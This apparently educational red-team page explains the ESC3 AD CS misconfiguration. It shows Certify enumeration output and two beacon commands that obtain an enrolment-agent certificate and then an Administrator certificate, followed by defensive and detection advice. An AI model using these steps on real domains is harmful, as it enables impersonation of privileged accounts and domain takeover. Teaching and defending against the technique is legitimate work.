---
title: "Misconfigured 'Certificate Request Agent' Templates"
date: 2026-09-25
weight: 4
type: docs
tags:
  - AD CS
  - Certificate Templates
  - ESC3
  - Active Directory
---

## What ESC3 is

ESC3 is a privilege-escalation condition that arises when an attacker can enrol for a certificate carrying the *Certificate Request Agent* EKU. A certificate with that EKU is permitted to sign certificate requests submitted on behalf of other users, which is precisely the capability an attacker needs to impersonate an arbitrary account.

Enumerating the templates reveals the condition. Certify flags the Certificate Request Agent EKU and shows the surrounding enrolment settings:

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

    Template Name                         : ESC3
    Enabled                               : True
    Publishing CAs                        : hq-ca-01.arcadia.local\ARCADIA Root CA
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Certificate Request Agent
    Certificate Application Policies      : Certificate Request Agent
    Vulnerabilities
      ESC3                                : The template has the 'Certificate Request Agent' EKU.
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ARCADIA\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
```

Three details combine to make this exploitable: the Certificate Request Agent EKU is enabled, *Domain Users* hold enrolment rights, and neither manager approval nor authorised signatures are required.

## Abusing it

Exploitation is a two-step process. First, request a certificate from the vulnerable template using your own user context. This yields the enrolment-agent certificate itself:

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "hq-ca-01.arcadia.local\ARCADIA Root CA" --template ESC3 --quiet
[*] Action: Request a certificate
[*] Current user context    : ARCADIA\bmarsh
[*] Template                : ESC3
[*] Subject                 : CN=Ben Marsh, CN=Users, DC=arcadia, DC=local
[*] Certificate Authority   : hq-ca-01.arcadia.local\ARCADIA Root CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 3
[*] Certificate (PFX)       : MIACAQ[...snip...]AAAAA=
```

With the agent certificate in hand, use it to request a second certificate on behalf of someone else. The built-in *User* template is a convenient target here, because it has the Client Authentication EKU enabled, and the request is made on behalf of a privileged account:

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "hq-ca-01.arcadia.local\ARCADIA Root CA" --template User --target Administrator --agent-pfx MIACAQ[...snip...]AAAAA= --quiet
[*] Action: Request a certificate (on behalf of another user)
[*] Current user context    : ARCADIA\bmarsh
[*] Template                : User
[*] On Behalf Of            : Administrator
[*] Certificate Authority   : hq-ca-01.arcadia.local\ARCADIA Root CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 4
[*] Certificate (PFX)       : MIACAQ[...snip...]AAAAAA
```

The final PFX is a client-authentication certificate for the Administrator account, which can then be used with Rubeus' `asktgt` to obtain a TGT as that user.

## Defensive considerations

The Certificate Request Agent EKU delegates a great deal of trust, since anyone holding such a certificate can effectively enrol as other users, so templates that grant it should be tightly controlled. Restrict enrolment on any enrolment-agent template to a small, trusted group rather than broad principals such as *Domain Users* or *Authenticated Users*, and require manager approval so that requests cannot be issued unattended. On the enrolling side, enrolment-agent restrictions can be configured on the CA to limit which templates an agent may request on behalf of others and for which accounts, which contains the blast radius even where an agent certificate is obtained. For detection, on-behalf-of requests are comparatively rare in most environments, so a request-agent enrolment that targets a privileged account is a strong signal worth alerting on.

## Further reading

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [GhostPack Certify](https://github.com/GhostPack/Certify)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)